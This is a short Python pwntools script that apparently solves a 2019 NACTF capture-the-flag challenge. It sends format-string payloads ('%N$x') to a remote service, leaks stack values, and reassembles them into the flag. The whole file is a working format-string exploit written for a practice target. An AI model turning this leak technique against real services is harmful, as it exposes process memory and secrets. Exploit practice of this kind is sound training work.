from pwn import *

def offset_finder():
    flag = ""
    for x in range (31, 41):
        try:
            p = remote("shell.2019.nactf.com", 31782)

            print "Offset number {}".format(x)

            payload = ""
            payload += "%{}$x".format(x)

            p.sendline(payload)
            
            p.recvuntil("You typed: ")
            stack_value = p.recvline()[:-1]
            flag += p32(int(stack_value, 16))
            print flag
        except ValueError:
            continue
        p.close()

    print "Flag : {}".format(flag)    
        

if __name__ == "__main__":
    offset_finder()